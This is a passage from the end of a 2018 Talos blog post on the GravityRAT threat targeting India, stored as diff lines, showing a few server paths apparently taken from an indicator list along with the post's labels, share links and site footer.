+/G3/ServerSide/G3.php
+/G3/Payload/
+/GX/GX-Server.php
+/GetActiveDomains.php
+
+P O S T E D  B Y  P A U L  R A S C A G N E R E S AT  1 1 : 1 1  A M 
+
+L A B E L S :  . N E T ,  A P T ,  G R A V I T Y R AT ,  I N D I A ,  M A C R O S ,  M A L D O C ,  M A LW A R E  A N A LY S I S
+
+   
+
+Enter your comment...
+
+NO COMMENTS:
+
+POST A COMMENT
+
+Convert webpages to pdf online with PDFmyURL
+
+https://www.blogger.com/profile/10073079939160046441
+https://blog.talosintelligence.com/search/label/.NET
+https://blog.talosintelligence.com/search/label/APT
+https://blog.talosintelligence.com/search/label/GravityRAT
+https://blog.talosintelligence.com/search/label/India
+https://blog.talosintelligence.com/search/label/macros
+https://blog.talosintelligence.com/search/label/MalDoc
+https://blog.talosintelligence.com/search/label/Malware Analysis
+https://www.facebook.com/sharer.php?u=http://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html&text=GravityRAT - The Two-Year Evolution Of An APT Targeting India
+https://twitter.com/share?url=http://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html&text=GravityRAT - The Two-Year Evolution Of An APT Targeting India
+http:////www.reddit.com/submit?url=http://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html&title=GravityRAT - The Two-Year Evolution Of An APT Targeting India
+mailto:?body=http://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html&subject=GravityRAT - The Two-Year Evolution Of An APT Targeting India
+https://www.blogger.com/comment-iframe.g?blogID=1029833275466591797&postID=6188594294975286687&blogspotRpcToken=3791464
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
+
+Software
+
+Reputation Center
+
+Vulnerability Information  
+
+Library
+
+Support Communities
+
+Microsoft Advisory Snort Rules  
+
+IP Blacklist Download
+
+AWBO Exercises
+
+About Talos  
+
+Careers
+
+Blog
+
+CONNECT WITH US
+
+   
+
+© 2018 Cisco Systems, Inc. and/or its affiliates. All rights reserved. View our Privacy Policy here.
+
+N E W E R
+
+P O S T
+
+O L D E R
+
+P O S T
+
+H O M E
+
+S U B S C R I B E  T O :  P O S T  C O M M E N T S  ( AT O M )
+
+Enter your comment...
+
+Comment as: Select profile...
+
+PublishPublish  PreviewPreview
+
+Convert webpages to pdf online with PDFmyURL
+
+https://blog.talosintelligence.com/2018/04/threat-round-up-0420-0427.html
+https://blog.talosintelligence.com/2018/04/hyland-vulnerabilities-code-execution.html
+https://blog.talosintelligence.com/
+https://blog.talosintelligence.com/feeds/6188594294975286687/comments/default
+http://talosintelligence.com/software
+http://talosintelligence.com/reputation
+http://talosintelligence.com/vulnerability-reports
+http://talosintelligence.com/resources
+http://talosintelligence.com/community
+http://talosintelligence.com/ms_advisories
+http://talosintelligence.com/documents/ip-blacklist
+http://talosintelligence.com/awbo_exercises
+http://talosintelligence.com/about
+http://talosintelligence.com/careers
+https://blog.talosintelligence.com
+https://twitter.com/talossecurity
+https://www.facebook.com/groups/TalosGroupatCisco/
+https://www.youtube.com/playlist?list=PLFT-9JpKjRTDn_qtGN238gzycJfaVzMqD
+https://www.linkedin.com/grp/home?gid=8287731
+http://www.cisco.com/web/siteassets/legal/privacy_full.html
+https://pdfmyurl.com/?src=pdf
+https://pdfmyurl.com/?src=pdf
+
